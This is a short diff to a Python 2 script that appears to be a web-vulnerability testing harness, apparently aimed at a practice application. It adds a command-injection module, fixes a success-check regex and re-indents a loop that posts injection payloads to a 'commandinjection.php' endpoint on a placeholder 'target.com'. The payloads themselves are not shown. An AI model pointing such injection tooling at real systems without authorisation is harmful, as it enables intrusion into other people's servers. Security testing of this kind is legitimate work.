@@ -3,6 +3,7 @@ import ssci
 import oRedirect 
 import re
 import sqli
+import cmd
 from datetime import datetime
 
 BASE_URL = "http://target.com"
@@ -45,10 +46,10 @@ def checkSuccess(html, attackType, content, v=False):
 		print html
 
 	if attackType == shell_command:
-		match = re.findall(r'<pre>+', html)
-        if len(match) == 0:
-            return None
-        return match
+		match = re.findall(r'<pre>.+', html)
+		if len(match) == 0:
+			return None
+		return match
 
 	if attackType == sql_injection:
 		match = re.findall(r'<p>.+', html)
@@ -76,10 +77,10 @@ def checkSuccess(html, attackType, content, v=False):
 if __name__ == "__main__":
 
 	## test shell command
-    url = "/commandinjection/commandinjection.php"
-    payloads = cmd.get_all()
-    for payload in payloads:
-        injectPayload(url, "host", 'POST', payload)
+	url = "/commandinjection/commandinjection.php"
+	payloads = cmd.get_all()
+	for payload in payloads:
+		injectPayload(url, "host", 'POST', payload)
 
 
 	#sqli
